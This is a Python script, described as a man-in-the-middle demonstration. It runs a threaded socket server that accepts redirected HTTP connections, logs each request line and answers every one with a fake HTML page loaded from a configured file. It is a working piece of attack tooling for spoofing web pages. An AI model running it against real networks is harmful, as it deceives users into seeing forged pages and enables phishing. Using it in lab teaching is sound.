"""
HTTP Interceptor Proxy for MITM Demonstration
"""

import socket
import threading
import os
from config import PROXY_PORT, FAKE_PAGE


def load_fake_page(path):
    with open(path, "r") as f:
        return f.read()


def build_http_response(body):
    body_bytes = body.encode("utf-8")
    response = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=UTF-8\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return response.encode("utf-8") + body_bytes


def handle_client(client_sock, client_addr, fake_page):
    try:
        request = client_sock.recv(4096)
        if not request:
            client_sock.close()
            return

        first_line = request.split(b"\r\n")[0].decode("utf-8", errors="replace")
        print(f"[+] Intercepted from {client_addr[0]}:{client_addr[1]} -> {first_line}")

        response = build_http_response(fake_page)
        client_sock.sendall(response)
        print(f"    -> Injected fake page ({len(fake_page)} bytes)")

    except Exception as e:
        print(f"[!] Error handling {client_addr}: {e}")
    finally:
        client_sock.close()


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    fake_page_path = os.path.join(script_dir, FAKE_PAGE)
    fake_page = load_fake_page(fake_page_path)

    print(f"[+] Loaded fake page: {fake_page_path} ({len(fake_page)} bytes)")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PROXY_PORT))
    server.listen(10)

    print(f"[*] HTTP interceptor listening on port {PROXY_PORT}")
    print(f"[*] Waiting for redirected connections...\n")

    try:
        while True:
            client_sock, client_addr = server.accept()
            t = threading.Thread(target=handle_client,
                                 args=(client_sock, client_addr, fake_page))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down interceptor.")
        server.close()


if __name__ == "__main__":
    main()
